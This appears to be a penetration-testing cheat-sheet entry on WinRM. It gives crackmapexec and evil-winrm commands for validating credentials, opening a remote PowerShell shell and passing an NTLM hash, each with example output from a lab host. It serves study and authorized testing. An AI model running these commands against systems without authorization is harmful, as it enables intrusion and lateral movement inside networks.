# WinRM (5985/5986)

### Check access with found creds

```bash
crackmapexec winrm $IP -u <user> -p <pass>
```

> Pwn3d! = shell access

**Why:** Remote management

<details>
<summary>Example Output</summary>

```
crackmapexec winrm 10.10.10.5 -u john -p Password123
WINRM  10.10.10.5  5985  DC01  [+] corp.local\john:Password123 (Pwn3d!)
(Pwn3d! = you can get a shell)
```
</details>

---

### Get shell

```bash
evil-winrm -i $IP -u <user> -p <pass>
```

> Interactive PowerShell

**Why:** Full shell access

<details>
<summary>Example Output</summary>

```
evil-winrm -i 10.10.10.5 -u john -p Password123
*Evil-WinRM* PS C:\Users\john\Documents> whoami
corp\john
(Interactive PowerShell session)
```
</details>

---

### Pass the hash

```bash
evil-winrm -i $IP -u <user> -H <ntlm_hash>
```

> With NTLM hash

**Why:** No password needed

<details>
<summary>Example Output</summary>

```
evil-winrm -i 10.10.10.5 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
*Evil-WinRM* PS C:\Users\Administrator>

(evil-winrm supports PTH natively with -H flag)
(No password needed, just the NT hash)
```
</details>

---
